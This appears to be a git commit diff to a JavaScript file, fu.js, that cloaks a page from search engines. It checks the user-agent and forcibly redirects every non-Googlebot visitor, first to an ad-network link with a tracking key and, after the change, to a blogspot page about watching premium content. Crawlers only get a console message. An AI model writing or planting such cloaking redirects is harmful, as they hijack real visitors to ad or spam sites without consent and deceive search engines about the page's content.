3251816f8c768b0fada092e6e375e0aa0d33e90b
channeltoday <o.nlinechanneltoday@gmail.com>
2026-08-27 02:37:30 +0600

    Change redirect URL for non-crawler users

--- fu.js
+++ fu.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://www.profitableratecpmnetwork.com/e3t5ipk0wt?key=3043f120f199e439d1336f4f7382d912";
+  window.location.href = "https://bestwaytowatchpremium.blogspot.com";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
